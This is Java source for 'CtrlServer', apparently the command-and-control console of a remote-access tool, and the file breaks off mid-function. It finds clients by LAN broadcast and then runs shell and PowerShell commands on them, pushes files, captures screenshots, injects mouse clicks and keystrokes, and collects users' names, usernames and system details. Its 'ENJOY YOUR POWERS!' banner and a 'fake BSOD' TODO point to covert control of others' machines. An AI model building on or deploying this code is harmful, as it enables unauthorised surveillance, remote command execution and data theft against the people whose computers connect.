package main;

import java.awt.image.BufferedImage;
import java.awt.event.MouseListener;
import java.awt.event.WindowEvent;
import java.awt.Image;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ByteArrayInputStream;
import java.net.Socket;
import java.net.ServerSocket;
import java.net.InetAddress;
import java.net.DatagramSocket;
import java.net.DatagramPacket;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Stack;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Timer;
import java.util.TimerTask;

import javax.swing.JFileChooser;
import javax.swing.filechooser.FileFilter;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.KeyStroke;
import javax.swing.ImageIcon;
import javax.swing.UIManager;
import javax.imageio.ImageIO;

import static comms.Comms.*;
import monitor.MonitorServer;

class PurgeUnreachableSocketsService extends TimerTask {
	@Override
	public void run() {
		for(Socket client : CtrlServer.clients) {
			try {
				if(!client.getInetAddress().isReachable(500)) {
					CtrlServer.clients.remove(client);
				}
			}
			catch(IOException e) {
				CtrlServer.clients.remove(client);
			}
		}
	}
}
class WaitForConnectionsService implements Runnable {
	ServerSocket server;
	boolean finished = false;
	
	public WaitForConnectionsService(ServerSocket server) {
		this.server = server;
	}
	@Override
	public void run() {
		while(!finished) {
			try {
				Socket connection = server.accept();
				CtrlServer.clients.add(connection);
			} 
			catch (IOException e) {
			}
		}
	}
	public void stop() {
		finished = true;
	}
}


public class CtrlServer extends WindowAdapter implements MouseListener {
	//TODO C9x fake BSOD?
	static final double IMG_SCALE = 2.0/3.0;
	static HashMap<String, String> helpMap = new HashMap<String, String>();
	static ArrayList<String> commandNames = new ArrayList<String>();
	static BufferedReader in;
	static byte[] packetData;
	static DatagramPacket dPacket;
	static DatagramSocket dSocket;
	static ServerSocket server;
	static BroadcastService broadcast;
	static WaitForConnectionsService wait;
	static Socket client = null;
	static DataOutputStream cout;
	static DataInputStream cin;
	static JFrame frame;
	static InteractiveScreenshotFrame iFrame;
	static Timer timer = new Timer();
	volatile static boolean block = false;
	volatile static ArrayDeque<Socket> clients = new ArrayDeque<Socket>();
	static HashMap<Character, Integer> specialKeyCodes = new HashMap<Character, Integer>();
	static void loadHelp() throws IOException {
		BufferedReader helpFile = new BufferedReader(new InputStreamReader(CtrlServer.class.getResourceAsStream("/resources/help.txt")));
		String key;
		while((key = helpFile.readLine()) != null) {
			String line;
			StringBuilder body = new StringBuilder();
			String title = helpFile.readLine();
			commandNames.add(title);
			while(!(line = helpFile.readLine()).trim().equals("<END>")) {
				body.append(line + '\n');
			}
			if(!key.contains(",")) {
				helpMap.put(key, title + '\n' + body);
			}
			else {
				for(String k : key.split(",")) {
					helpMap.put(k, title + '\n' + body);
				}
			}
		}
	}
	static void initSpecialKeyStrokes() {
		specialKeyCodes.put('_', KeyEvent.VK_MINUS);
		specialKeyCodes.put('{', KeyEvent.VK_OPEN_BRACKET);
		specialKeyCodes.put('}', KeyEvent.VK_CLOSE_BRACKET);
		specialKeyCodes.put('+', KeyEvent.VK_EQUALS);
		specialKeyCodes.put(':', KeyEvent.VK_SEMICOLON);
		specialKeyCodes.put('|', KeyEvent.VK_BACK_SLASH);
		specialKeyCodes.put('\"', KeyEvent.VK_QUOTE);
		specialKeyCodes.put('<', KeyEvent.VK_COMMA);
		specialKeyCodes.put('>', KeyEvent.VK_PERIOD);
		specialKeyCodes.put('?', KeyEvent.VK_SLASH);
		specialKeyCodes.put('!', KeyEvent.VK_1);
		specialKeyCodes.put('@', KeyEvent.VK_2);
		specialKeyCodes.put('#', KeyEvent.VK_3);
		specialKeyCodes.put('$', KeyEvent.VK_4);
		specialKeyCodes.put('%', KeyEvent.VK_5);
		specialKeyCodes.put('^', KeyEvent.VK_6);
		specialKeyCodes.put('&', KeyEvent.VK_7);
		specialKeyCodes.put('*', KeyEvent.VK_8);
		specialKeyCodes.put('(', KeyEvent.VK_9);
		specialKeyCodes.put(')', KeyEvent.VK_0);
		specialKeyCodes.put('~', KeyEvent.VK_BACK_QUOTE);
		
	}
	static int getKeyComboKeyCode(String key) throws IllegalArgumentException {
		if(key.length() < 1) {
			throw new IllegalArgumentException("No key specified!");
		}
		if(key.length() == 1) {
			return KeyEvent.getExtendedKeyCodeForChar(key.charAt(0));
		}
		else {
			switch(key) {
			case "ctrl":
				return KeyEvent.VK_CONTROL;
			case "alt":
				return KeyEvent.VK_ALT;
			case "shift":
				return KeyEvent.VK_SHIFT;
			case "delete":
				return KeyEvent.VK_DELETE;
			case "enter":
				return KeyEvent.VK_ENTER;
			case "esc":
				return KeyEvent.VK_ESCAPE;
			case "leftarrow":
			case "larrow":
				return KeyEvent.VK_LEFT;
			case "rightarrow":
			case "rarrow":
				return KeyEvent.VK_RIGHT;
			case "uparrow":
			case "uarrow":
				return KeyEvent.VK_UP;
			case "downarrow":
			case "darrow":
				return KeyEvent.VK_DOWN;
			default:
				throw new IllegalArgumentException(key + " is not a valid key!");
			}
		}
	}
	
	public static void main(String[] args) {
		initSpecialKeyStrokes();
		try {
			loadHelp();
		}
		catch(IOException e) {
			System.err.println("An error occurred when trying to load help file.");
		}
		try {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		} 
		catch (Exception e) {
			System.err.println("An error occurred when trying to set the Look and Feel. The default Java Metal Look and Feel will be used.");
		} 
		in = new BufferedReader(new InputStreamReader(System.in));
		Runtime.getRuntime().addShutdownHook(new ShutdownHook());
		System.out.println("--------------------------------- CtrlServer ---------------------------------");
		System.out.println("Version " + SERVERVER);
		System.out.println("Note: This version of Ctrl software is designed primarily for Windows machines. While some of the features will still function on a non-Windows machine, others such as getting the full username cannot be used.");
		System.out.println("ENJOY YOUR POWERS!");
		System.out.println("------------------------------------------------------------------------------");
		try {
			System.out.println("Initializing...");
			InetAddress localhost = InetAddress.getLocalHost();
			server = new ServerSocket(PORT);
			System.out.println("Starting Broadcast Service...");
			dSocket = new DatagramSocket();
			dSocket.setBroadcast(true);
			packetData = localhost.getHostAddress().getBytes();
			dPacket = new DatagramPacket(packetData, packetData.length, InetAddress.getByName("255.255.255.255"), PORT);
			dSocket.send(dPacket);
			System.out.println("INFO: Your IP address is " + localhost.getHostAddress());
			
			broadcast = new BroadcastService(dSocket, dPacket);
			Thread broadcastThread = new Thread(broadcast, "broadcast service");
			broadcastThread.start();
			
			System.out.println("Waiting for connections...\nPress enter to cancel.");
			client = null;
			wait = new WaitForConnectionsService(server);
			Thread waitThread = new Thread(wait, "wait for connections service");
			waitThread.start();
			
			while(clients.size() == 0) {
				Thread.sleep(500);
				if(System.in.available() > 0) {
					in.readLine();
					System.out.println("Exiting...");
					System.exit(0);
				}
			}
			client = clients.poll();
			
			timer.schedule(new PurgeUnreachableSocketsService(), 5000, 5000);
			
			System.out.println("Connection established.");
			System.out.println("---------------------------------- TERMINAL ----------------------------------");
			System.out.println(
					"Enter commands below to be executed on the connected client.\n" +
					"Enter \"Exit\" to exit this program.\n" +
					"Enter \"Help\" for help.");
			System.out.println("----------");
			
			String command;
			cout = new DataOutputStream(client.getOutputStream());
			cin = new DataInputStream(client.getInputStream());
			System.out.print(">>> ");
			while(!(command = in.readLine().toLowerCase()).equals("exit")) {
				parseCommand(command);
				System.out.print(">>> ");
			}
			
			
			System.out.println("Exiting...");
			System.exit(0);
		}
		catch(Exception e) {
			System.err.println("An exception was thrown:");
			e.printStackTrace();
			System.out.println("The program will now exit.");
			System.exit(0);
		}
	}
	
	static void parseCommand(String command) throws Exception {
		String sub;
		int indexOfSpace = command.indexOf(' ');
		if(indexOfSpace == -1) {
			sub = command;
		}
		else {
			sub = command.substring(0, command.indexOf(' '));
		}
		switch(sub) {
		//BOOKMARK Command switch starting point
		case "help":
		{
			String[] tokens = command.split(" ");
			if(tokens.length < 2) {
				System.out.println("List of all commands:");
				System.out.println("All names are non-case-sensitive.\n<PARAM> indicates a required parameter. [PARAM] indicates an optional parameter.");
				for(String cmdName : commandNames) {
					System.out.println("\t" + cmdName);
				}
				System.out.println("Use Help <COMMAND> to get more information about a command.");
				System.out.println("<COMMAND> is the name or alias of a command, not including its parameters.");
			}
			else {
				if(helpMap.containsKey(tokens[1].toLowerCase())) {
					System.out.print(helpMap.get(tokens[1].toLowerCase()));
				}
				else {
					System.out.println("There is no command with the name of " + tokens[1]);
				}
			}
		}
			break;
		case "cc":
		case "clientcount":
		{
			System.out.println("There are currently " + clients.size() + " clients waiting in queue.");
		}
			break;
		case "nc":
		case "nextclient":
		{
			if(clients.size() == 0) {
				System.out.println("There are no clients in queue.");
				break;
			}
			
			try {
				int clientNumber = Integer.parseInt(command.split(" ")[1]);
				if(clientNumber <= 0 || clientNumber > clients.size()) {
					System.out.println("Invalid client number.");
					break;
				}
				for(int i = 0; i < clientNumber; i ++) {
					clients.add(client);
					client = clients.poll();
				}
			}
			catch(ArrayIndexOutOfBoundsException e) {
				clients.add(client);
				client = clients.poll();
			}
			catch(NumberFormatException e) {
				System.out.println("Usage: NextClient/NC [CLIENT#]");
				break;
			}
			System.out.println("The client has been changed.");
		}
			break;
		case "closeconnection":
		{
			if(clients.size() == 0) {
				System.out.println("There are no clients waiting at this moment. The program will close the connection and wait.");
				client.close();
				client = null;
				System.out.println("Press enter to abort the process and exit the program.");
				while(clients.size() == 0) {
					Thread.sleep(500);
					if(System.in.available() > 0) {
						in.readLine();
						System.out.println("Exiting...");
						System.exit(0);
					}
				}
				client = clients.poll();
			}
			else {
				client.close();
				client = clients.poll();
			}
			cin.close();
			cout.close();
			cin = new DataInputStream(client.getInputStream());
			cout = new DataOutputStream(client.getOutputStream());
			System.out.println("The client has been changed.");
		}
			break;
		case "rawin":
		{
			if(command.length() <= 6) {
				System.out.println("Usage: RawIn <DIR> <CMD>");
				break;
			}
			String sub2 = command.substring(6);
			String dir, cmd;
			try {
				if(sub2.charAt(0) == '\"') {
					sub2 = sub2.substring(1);
					int index = sub2.indexOf('\"');
					dir = sub2.substring(0, index);
					cmd = sub2.substring(index + 2);
				}
				else {
					int index = sub2.indexOf(' ');
					dir = sub2.substring(0, index);
					cmd = sub2.substring(index + 1);
				}
			}
			catch(StringIndexOutOfBoundsException e) {
				System.out.println("Usage: RawIn <DIR> <CMD>");
				break;
			}
			cout.writeByte(CMD_RAWIN);
			cout.writeUTF(dir);
			cout.writeUTF(cmd);
			System.out.println(cin.readUTF());
		}
			break;
		case "runin":
		{
			if(command.length() <= 6) {
				System.out.println("Usage: RunIn <DIR> <CMD>");
				break;
			}
			String sub2 = command.substring(6);
			String dir, cmd;
			try {
				if(sub2.charAt(0) == '\"') {
					sub2 = sub2.substring(1);
					int index = sub2.indexOf('\"');
					dir = sub2.substring(0, index);
					cmd = sub2.substring(index + 2);
				}
				else {
					int index = sub2.indexOf(' ');
					dir = sub2.substring(0, index);
					cmd = sub2.substring(index + 1);
				}
			}
			catch(StringIndexOutOfBoundsException e) {
				System.out.println("Usage: RunIn <DIR> <CMD>");
				break;
			}
			cout.writeByte(CMD_RUNIN);
			cout.writeUTF(dir);
			cout.writeUTF(cmd);
			System.out.println(cin.readUTF());
		}
			break;
		case "psin":
		{
			if(command.length() <= 5) {
				System.out.println("Usage: PSIn <DIR> <CMD>");
				break;
			}
			String sub2 = command.substring(5);
			String dir, cmd;
			try {
				if(sub2.charAt(0) == '\"') {
					sub2 = sub2.substring(1);
					int index = sub2.indexOf('\"');
					dir = sub2.substring(0, index);
					cmd = sub2.substring(index + 2);
				}
				else {
					int index = sub2.indexOf(' ');
					dir = sub2.substring(0, index);
					cmd = sub2.substring(index + 1);
				}
			}
			catch(StringIndexOutOfBoundsException e) {
				System.out.println("Usage: PSIn <DIR> <CMD>");
				break;
			}
			cout.writeByte(CMD_RUNPSIN);
			cout.writeUTF(dir);
			cout.writeUTF(cmd);
			System.out.println(cin.readUTF());
		}
			break;
		case "sendfile":
		{
			if(command.length() <= 9) {
				System.out.println("Usage: SendFile <FILENAME> [LOCATION]");
				break;
			}
			String sub2 = command.substring(9);
			String fileName, dir;
			String fileNameNoPath;
			try {
				if(sub2.charAt(0) == '\"') {
					sub2 = sub2.substring(1);
					int index = sub2.indexOf('\"');
					if(index >= 0 && sub2.length() > index + 1) {
						fileName = sub2.substring(0, index);
						dir = sub2.substring(index + 2);
					}
					else {
						fileName = sub2.substring(0, index);
						dir = ".";
					}
				}
				else {
					int index = sub2.indexOf(' ');
					if(index >= 0) {
						fileName = sub2.substring(0, index);
						dir = sub2.substring(index + 1);
					}
					else {
						fileName = sub2;
						dir = ".";
					}
				}
			}
			catch(StringIndexOutOfBoundsException e) {
				System.out.println("Usage: SendFile <FILENAME> [LOCATION]");
				break;
			}
			File file = new File(fileName);
			if(!file.exists()) {
				System.err.println("Error: The file specified does not exist.");
				File currentDir = new File(".");
				System.out.println("Files in your current directory are:");
				for(File f : currentDir.listFiles()) {
					if(f.isFile()) {
						System.out.println(f.getName());
					}
				}
				break;
			}
			if(file.isDirectory()) {
				System.err.println("Error: The file specified is a directory. Directories are currently not supported.");
				break;
			}
			fileNameNoPath = file.getName();
			String filePathNew;
			if(dir.equals(".")) {
				filePathNew = fileNameNoPath;
			}
			else {
				if(dir.endsWith(File.separator))
					filePathNew = dir + fileNameNoPath;
				else
					filePathNew = dir + File.separatorChar + fileNameNoPath;
			}
			
			byte[] fileBytes;
			try {
				System.out.println("Converting file to byte array...");
				ByteArrayOutputStream fileBAOS = new ByteArrayOutputStream();
				FileInputStream fileIn = new FileInputStream(file);
				byte[] buf = new byte[2048];
				int bytesRead;
				while((bytesRead = fileIn.read(buf)) != -1) {
					fileBAOS.write(buf, 0, bytesRead);
				}
				fileIn.close();
				fileBytes = fileBAOS.toByteArray();
			}
			catch(IOException e) {
				System.err.println("Error reading file into byte array:");
				e.printStackTrace();
				break;
			}
			
			System.out.println("Sending File...");
			cout.writeByte(CMD_FILE);
			cout.writeInt(fileBytes.length);
			cout.write(fileBytes);
			cout.writeUTF(filePathNew);
			System.out.println(cin.readUTF());
		}
			break;
		case "ps":
		{
			if(command.length() <= 3) {
				System.out.println("Usage: PS <CMD>");
				break;
			}
			cout.writeByte(CMD_RUNPS);
			cout.writeUTF(command.substring(3));
			System.out.println(cin.readUTF());
		}
			break;
		case "leftclick":
		{
			cout.writeByte(CMD_LCLICK);
			if(cin.readByte() == RET_SUCCESS) {
				System.out.println("Success");
			}
			else {
				System.out.println("An error occurred.");
			}
		}
			break;
		case "rightclick":
		{
			cout.writeByte(CMD_RCLICK);
			if(cin.readByte() == RET_SUCCESS) {
				System.out.println("Success");
			}
			else {
				System.out.println("An error occurred.");
			}
		}
			break;
		case "middleclick":
		{
			cout.writeByte(CMD_MCLICK);
			if(cin.readByte() == RET_SUCCESS) {
				System.out.println("Success");
			}
			else {
				System.out.println("An error occurred.");
			}
		}
			break;
		case "movemouse":
		case "mm":
		{
			String[] tokens = command.split(" ");
			try {
				cout.writeByte(CMD_MMOVE);
				cout.writeInt(Integer.parseInt(tokens[1]));
				cout.writeInt(Integer.parseInt(tokens[2]));
				if(cin.readByte() == RET_SUCCESS) {
					System.out.println("Success");
				}
				else {
					System.out.println("An error occurred.");
				}
			}
			catch(ArrayIndexOutOfBoundsException | NumberFormatException e) {
				System.out.println("Usage: MoveMouse/MM <X> <Y>");
			}
		}
			break;
		case "ss":
		case "screenshot":
		{
			cout.writeByte(CMD_SSHOT);
			if(cin.readByte() == RET_SUCCESS) {
				int size = cin.readInt();
				byte[] dataRaw = new byte[size];
				cin.readFully(dataRaw);
				ByteArrayInputStream dataStream = new ByteArrayInputStream(dataRaw);
				BufferedImage img = ImageIO.read(dataStream);
				dataStream.close();
				
				if(frame != null) {
					frame.dispose();
				}
				frame = new JFrame();
				frame.setResizable(false);
				frame.setTitle("Screenshot from client");
				Image imgScaled = img.getScaledInstance((int) (img.getWidth() * IMG_SCALE), (int) (img.getHeight() * IMG_SCALE), Image.SCALE_SMOOTH);
				JLabel imgLabel = new JLabel(new ImageIcon(imgScaled));
				frame.add(imgLabel);
				frame.setJMenuBar(new ScreenshotMenuBar(frame, imgLabel, img));
				frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
				frame.pack();
				frame.setVisible(true);
			}
			else {
				System.out.println("An error occurred.");
			}
		}
			break;
		case "clickablescreenshot":
		case "css":
		{
			cout.writeByte(CMD_SSHOT);
			if(cin.readByte() == RET_SUCCESS) {
				int size = cin.readInt();
				byte[] dataRaw = new byte[size];
				cin.readFully(dataRaw);
				ByteArrayInputStream dataStream = new ByteArrayInputStream(dataRaw);
				BufferedImage img = ImageIO.read(dataStream);
				dataStream.close();
				
				if(frame != null) {
					frame.dispose();
				}
				frame = new JFrame();
				frame.setResizable(false);
				frame.setTitle("Clickable screenshot from client");
				Image imgScaled = img.getScaledInstance((int) (img.getWidth() * IMG_SCALE), (int) (img.getHeight() * IMG_SCALE), Image.SCALE_SMOOTH);
				JLabel imgLabel = new JLabel(new ImageIcon(imgScaled));
				frame.add(imgLabel);
				frame.setJMenuBar(new ScreenshotMenuBar(frame, imgLabel, img));
				CtrlServer listener = new CtrlServer();
				imgLabel.addMouseListener(listener);
				frame.addWindowListener(listener);
				frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
				frame.pack();
				frame.setVisible(true);
				block = true;
				while(block) {
					Thread.sleep(1000);
				}
				Thread.sleep(100);
			}
			else {
				System.out.println("An error occurred.");
			}
		}
			break;
		case "interactivescreenshot":
		case "iss":
		{
			cout.writeByte(CMD_SSHOT);
			if(cin.readByte() == RET_SUCCESS) {
				int size = cin.readInt();
				byte[] dataRaw = new byte[size];
				cin.readFully(dataRaw);
				ByteArrayInputStream dataStream = new ByteArrayInputStream(dataRaw);
				BufferedImage img = ImageIO.read(dataStream);
				dataStream.close();
				
				if(iFrame != null) {
					iFrame.dispose();
				}
				iFrame = new InteractiveScreenshotFrame();
				Image imgScaled = img.getScaledInstance((int) (img.getWidth() * IMG_SCALE), (int) (img.getHeight() * IMG_SCALE), Image.SCALE_SMOOTH);
				JLabel imgLabel = new JLabel(new ImageIcon(imgScaled));
				iFrame.setJMenuBar(new ScreenshotMenuBar(iFrame, imgLabel, img));
				iFrame.initLabel(imgLabel);
				iFrame.pack();
				iFrame.setVisible(true);
				Thread.sleep(100);
			}
			else {
				System.out.println("An error occurred.");
			}
		}
			break;
		case "clientnamelist":
		{
			if(clients.isEmpty()) {
				System.out.println("There are no clients waiting in the queue.");
				break;
			}
			int counter = 1;
			for(Socket s : clients) {
				DataInputStream sin = new DataInputStream(s.getInputStream());
				DataOutputStream sout = new DataOutputStream(s.getOutputStream());
				sout.writeByte(CMD_GETNAME);
				String name = sin.readUTF();
				System.out.print(counter++ + ". \tFull Name: ");
				if(name.equals("<ERROR_UNKNOWN_EXCEPTION_THROWN>")) {
					System.out.println("(An error occurred)");
				}
				else if(name.equals("<ERROR_NOT_WINDOWS>")) {
					System.out.println("(Non-Windows OS)");
				}
				else {
					System.out.println(name);
				}
			}
		}
			break;
		case "clientlist":
		{
			System.out.print("Current Client:\nFull Name:\t");
			cout.writeByte(CMD_GETNAME);
			String clientName = cin.readUTF();
			if(clientName.equals("<ERROR_UNKNOWN_EXCEPTION_THROWN>")) {
				System.out.println("(An error occurred)");
			}
			else if(clientName.equals("<ERROR_NOT_WINDOWS>")) {
				System.out.println("(Non-Windows OS)");
			}
			else {
				System.out.println(clientName);
			}
			cout.writeByte(CMD_INFO);
			System.out.println("Computer Name:\t" + cin.readUTF());
			System.out.println("Username:\t" + cin.readUTF());
			System.out.println("OS Name:\t" + cin.readUTF());
			
			if(clients.isEmpty()) {
				System.out.println("There are no clients waiting in the queue.");
				break;
			}
			
			int counter = 1;
			for(Socket s : clients) {
				DataInputStream sin = new DataInputStream(s.getInputStream());
				DataOutputStream sout = new DataOutputStream(s.getOutputStream());
				sout.writeByte(CMD_GETNAME);
				String name = sin.readUTF();
				System.out.print(counter++ + ". \tFull Name:\t");
				if(name.equals("<ERROR_UNKNOWN_EXCEPTION_THROWN>")) {
					System.out.println("(An error occurred)");
				}
				else if(name.equals("<ERROR_NOT_WINDOWS>")) {
					System.out.println("(Non-Windows OS)");
				}
				else {
					System.out.println(name);
				}
				sout.writeByte(CMD_INFO);
				System.out.println("\tComputer Name:\t" + sin.readUTF());
				System.out.println("\tUsername:\t" + sin.readUTF());
				System.out.println("\tOS Name:\t" + cin.readUTF());
			}
		}
			break;
		case "clientlistex":
		{
			System.out.print("Current Client:\nFull Name:\t");
			cout.writeByte(CMD_GETNAME);
			String clientName = cin.readUTF();
			if(clientName.equals("<ERROR_UNKNOWN_EXCEPTION_THROWN>")) {
				System.out.println("(An error occurred)");
			}
			else if(clientName.equals("<ERROR_NOT_WINDOWS>")) {
				System.out.println("(Non-Windows OS)");
			}
			else {
				System.out.println(clientName);
			}
			cout.writeByte(CMD_INFO);
			System.out.println("Computer Name:\t" + cin.readUTF());
			System.out.println("Username:\t" + cin.readUTF());
			System.out.println("OS Name:\t" + cin.readUTF());
			cout.writeByte(CMD_GETVER);
			System.out.println("Client Ver:\t" + cin.readUTF());
			cout.writeByte(CMD_JVMNAME);
			System.out.println("JVM Name:\t" + cin.readUTF());
			
			if(clients.isEmpty()) {
				System.out.println("There are no clients waiting in the queue.");
				break;
			}
			
			int counter = 1;
			for(Socket s : clients) {
				DataInputStream sin = new DataInputStream(s.getInputStream());
				DataOutputStream sout = new DataOutputStream(s.getOutputStream());
				sout.writeByte(CMD_GETNAME);
				String name = sin.readUTF();
				System.out.print(counter++ + ". \tFull Name:\t");
				if(name.equals("<ERROR_UNKNOWN_EXCEPTION_THROWN>")) {
					System.out.println("(An error occurred)");
				}
				else if(name.equals("<ERROR_NOT_WINDOWS>")) {
					System.out.println("(Non-Windows OS)");
				}
				else {
					System.out.println(name);
				}
				sout.writeByte(CMD_INFO);
				System.out.println("\tComputer Name:\t" + sin.readUTF());
				System.out.println("\tUsername:\t" + sin.readUTF());
				System.out.println("\tOS Name:\t" + cin.readUTF());
				sout.writeByte(CMD_GETVER);
				System.out.println("\tClient Ver:\t" + sin.readUTF());
			}
		}
			break;
		case "clientinfo":
		{
			cout.writeByte(CMD_INFO);
			System.out.println("Computer Name:\t" + cin.readUTF());
			System.out.println("Username:\t" + cin.readUTF());
			System.out.println("OS Name:\t" + cin.readUTF());
		}
			break;
		case "clientinfoex":
		{
			cout.writeByte(CMD_INFOEX);
			System.out.println("Username:\t\t" + cin.readUTF());
			System.out.println("User Home Directory:\t" + cin.readUTF());
			System.out.println("User Working Directory:\t" + cin.readUTF());
			System.out.println("Computer Name:\t\t" + cin.readUTF());
			System.out.println("OS Name:\t\t" + cin.readUTF());
			System.out.println("OS Architecture:\t" + cin.readUTF());
			System.out.println("OS Version:\t\t" + cin.readUTF());
			System.out.println("JVM Instance Name:\t" + cin.readUTF());
			System.out.println("JVM Vendor:\t\t" + cin.readUTF());
			System.out.println("JVM Version:\t\t" + cin.readUTF());
			System.out.println("CtrlClient Version:\t" + cin.readUTF());
			System.out.println("CtrlClient Current Dir:\t" + cin.readUTF());
			System.out.println("CtrlClient Jar Source:\t" + cin.readUTF());
		}
			break;
		case "jvminstancename":
		{
			cout.writeByte(CMD_JVMNAME);
			System.out.println("JVM Instance Name:\t" + cin.readUTF());
		}
			break;
		case "wfn":
		case "winfullname":
		{
			cout.writeByte(CMD_GETNAME);
			String name = cin.readUTF();
			if(name.equals("<ERROR_UNKNOWN_EXCEPTION_THROWN>")) {
				System.err.println("An error occurred when trying to retrieve the user's Full Name.");
			}
			else if(name.equals("<ERROR_NOT_WINDOWS>")) {
				System.err.println("The current client's machine is not Windows.");
			}
			else {
				System.out.println("Full Name of client:");
				System.out.println(name);
			}
		}
			break;
		case "shutdownclientsoftware":
		case "killclient":
		{
			cout.writeByte(CMD_KILL);
			System.out.println("The client software has been killed.");
			if(clients.size() == 0) {
				System.out.println("There are no clients waiting at this moment. The program will wait for a client to connect.");
				client.close();
				client = null;
				System.out.println("Press enter to abort the process and exit the program.");
				while(clients.size() == 0) {
					Thread.sleep(500);
					if(System.in.available() > 0) {
						in.readLine();
						System.out.println("Exiting...");
						System.exit(0);
					}
				}
				client = clients.poll();
			}
			else {
				client.close();
				client = clients.poll();
			}
			cin.close();
			cout.close();
			cin = new DataInputStream(client.getInputStream());
			cout = new DataOutputStream(client.getOutputStream());
			System.out.println("The client has been changed.");
		}
			break;
		case "setprotect":
		{
			String[] tokens = command.split(" ");
			if(tokens.length < 2) {
				System.out.println("Usage: SetProtect <STATE:ON/OFF>");
				break;
			}
			String state = tokens[1].toLowerCase();
			
			cout.writeByte(CMD_PROTECT);
			if(state.equals("on")) {
				cout.writeBoolean(true);
				if(cin.readByte() == RET_SUCCESS)
					System.out.println("Protect Service has been enabled.");
				else
					System.err.println("Error when attempting to enable Protect Service.");
			}
			else {
				cout.writeBoolean(false);
				if(cin.readByte() == RET_SUCCESS)
					System.out.println("Protect Service has been disabled.");
				else
					System.err.println("Error when attempting to disable Protect Service.");
			}
		}
			break;
		case "setcmdtimeout":
		{
			String[] tokens = command.split(" ");
			if(tokens.length < 2) {
				System.out.println("Usage: SetCmdTimeout <TIMEOUT>");
				break;
			}
			int newTimeout;
			try {
				newTimeout = Integer.parseInt(tokens[1]);
			}
			catch(NumberFormatException nfe) {
				System.out.println("Usage: SetCmdTimeout <TIMEOUT>");
				break;
			}
			cout.writeByte(CMD_SETTIMEOUT);
			cout.writeInt(newTimeout);
			if(cin.readByte() == RET_SUCCESS) {
				System.out.println("Successfully changed command timeout value.");
			}
			else {
				System.err.println("An error occurred when trying to set command timeout value.");
			}
		}
			break;
		case "keycombo":
		case "kc":
		{
			String[] tokens = command.split(" ");
			if(tokens.length < 2) {
				System.out.println("Usage: KeyCombo/KC <KEYS>");
				break;
			}
			ArrayList<Integer> codes = new ArrayList<Integer>();
			ArrayList<Boolean> isPress = new ArrayList<Boolean>();
			boolean successful = true;
			for(int i = 1; i < tokens.length; i ++) {
				tokens[i] = tokens[i].toLowerCase();
				if(tokens[i].charAt(0) == 'c') {
					String[] keys = tokens[i].substring(2).split(",");
					Stack<Integer> tempCodes = new Stack<Integer>();
					for(String key : keys) {
						isPress.add(true);
						try {
							int keyCode = getKeyComboKeyCode(key);
							codes.add(keyCode);
							tempCodes.push(keyCode);
						}
						catch(IllegalArgumentException e) {
							System.err.println(e.getMessage());
							successful = false;
							break;
						}
					}
					if(!successful)
						break;
					while(!tempCodes.isEmpty()) {
						isPress.add(false);
						codes.add(tempCodes.pop());
					}
				}
				else {
					if(tokens[i].charAt(0) == 'p') {
						isPress.add(true);
					}
					else if(tokens[i].charAt(0) == 'r') {
						isPress.add(false);
					}
					else {
						successful = false;
						System.err.println(tokens[i].charAt(0) + " is not p or n.");
						break;
					}
					String key = tokens[i].substring(2);
					try {
						codes.add(getKeyComboKeyCode(key));
					}
					catch(IllegalArgumentException e) {
						System.err.println(e.getMessage());
						successful = false;
						break;
					}
				}
			}
			if(!successful) {
				break;
			}
			cout.writeByte(CMD_INSERTSTR);
			cout.writeInt(codes.size());
			Iterator<Integer> codeIterator = codes.iterator();
			Iterator<Boolean> pressIterator = isPress.iterator();
			while(codeIterator.hasNext()) {
				cout.writeInt(codeIterator.next());
				cout.writeBoolean(pressIterator.next());
			}
			
			if(cin.readByte() == RET_SUCCESS) {
				System.out.println("Combo performed.");
			}
			else {
				System.out.println("An error occurred when trying to perform combo.");
			}
		}
			break;
		case "is":
		case "insertstr":
		{
			if(sub.equals("insertstr") && command.length() <= 10) {
				System.out.println("Usage: InsertStr/IS <STR>");
				break;
			}
			if(sub.equals("is") && command.length() <= 3) {
				System.out.println("Usage: InsertStr/IS <STR>");
				break;
			}
			cout.writeByte(CMD_INSERTSTR);
			ArrayList<Integer> codes = new ArrayList<Integer>();
			ArrayList<Boolean> isPress = new ArrayList<Boolean>();
			char[] chars = command.substring(sub.equals("is") ? 3 : 10).toCharArray();
			for(int i = 0; i < chars.length; i ++) {
				char ch = chars[i];
				if(ch == '%') {
					char c1 = chars[i + 1];
					char c2 = chars[i + 2];
					
					if(c1 == 'c') {
						codes.add(KeyEvent.VK_CONTROL);
						isPress.add(true);
						codes.add(KeyEvent.getExtendedKeyCodeForChar(c2));
						isPress.add(true);
						codes.add(KeyEvent.getExtendedKeyCodeForChar(c2));
						isPress.add(false);
						codes.add(KeyEvent.VK_CONTROL);
						isPress.add(false);
					}
					else {
						String subcmd = new String(new char[] { c1, c2 });
						switch(subcmd) {
						case "bk":
							codes.add(KeyEvent.VK_BACK_SPACE);
							isPress.add(true);
							codes.add(KeyEvent.VK_BACK_SPACE);
							isPress.add(false);
							break;
						case "dl":
							codes.add(KeyEvent.VK_DELETE);
							isPress.add(true);
							codes.add(KeyEvent.VK_DELETE);
							isPress.add(false);
							break;	
						case "nl":
							codes.add(KeyEvent.VK_ENTER);
							isPress.add(true);
							codes.add(KeyEvent.VK_ENTER);
							isPress.add(false);
							break;	
						case "tb":
							codes.add(KeyEvent.VK_TAB);
							isPress.add(true);
							codes.add(KeyEvent.VK_TAB);
							isPress.add(false);
							break;
						case "lk":
							codes.add(KeyEvent.VK_CAPS_LOCK);
							isPress.add(true);
							codes.add(KeyEvent.VK_CAPS_LOCK);
							isPress.add(false);
							break;
						case "ec":
							codes.add(KeyEvent.VK_ESCAPE);
							isPress.add(true);
